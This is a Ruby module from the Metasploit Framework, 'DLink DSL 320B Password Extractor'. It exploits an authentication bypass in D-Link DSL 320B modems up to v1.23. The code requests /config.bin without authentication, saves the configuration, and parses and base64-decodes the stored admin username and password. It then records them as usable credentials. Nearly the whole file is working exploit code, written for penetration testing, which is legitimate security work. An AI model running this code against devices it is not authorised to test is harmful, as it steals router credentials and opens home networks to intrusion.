##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'DLink DSL 320B Password Extractor',
			'Description' => %q{
				This module exploits an authentication bypass vulnerability in DSL 320B =< v1.23.
				With this vulnerability you are able to extract the password for the remote management.
				},
			'References'  =>
				[
					[ 'URL', 'http://www.dlink.com/de/de/home-solutions/connect/modems-and-gateways/dsl-320b-adsl-2-ethernet-modem' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-018' ],
					[ 'EDB', '25252' ],
					[ 'OSVDB', '93013' ]
				],
			'Author'      => [
				'Michael Messner <devnull@s3cur1ty.de>',
			],
			'License'     => MSF_LICENSE
		)
	end

	def run

		vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")

		#download configuration
		begin
			res = send_request_cgi({
				'uri' => '/config.bin',
				'method' => 'GET',
				})

			return if res.nil?
			return if (res.headers['Server'].nil? or res.headers['Server'] !~ /micro_httpd/)
			return if (res.code == 404)

			if res.body =~ /sysPassword value/ or res.body =~ /sysUserName value/
				if res.body !~ /sysPassword value/
					print_line("#{rhost}:#{rport} - Default Configuration of DSL 320B detected - no password section available, try admin/admin")
				else
					print_good("#{rhost}:#{rport} - credentials successfully extracted")
				end

				#store all details as loot -> there is some usefull stuff in the response
				loot = store_loot("Configuration_dsl320b.txt","text/plain",rhost, res.body)
				print_good("#{rhost}:#{rport} - Configuration of DSL 320B downloaded to: #{loot}")

				res.body.each_line do |line|
					if line =~ /\<sysUserName\ value\=\"(.*)\"\/\>/
						@user = $1
						next
					end
					if line =~ /\<sysPassword\ value\=\"(.*)\"\/\>/
						pass = $1
						vprint_good("#{rhost}:#{rport} - user: #{@user}")
						#pass = Base64.decode64(pass)
						pass = Rex::Text.decode_base64(pass)
						vprint_good("#{rhost}:#{rport} - pass: #{pass}")

					report_auth_info(
						:host => rhost,
						:port => rport,
						:sname => 'http',
						:user => @user,
						:pass => pass,
						:active => true
						)
					end
				end
			end
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end


	end
end
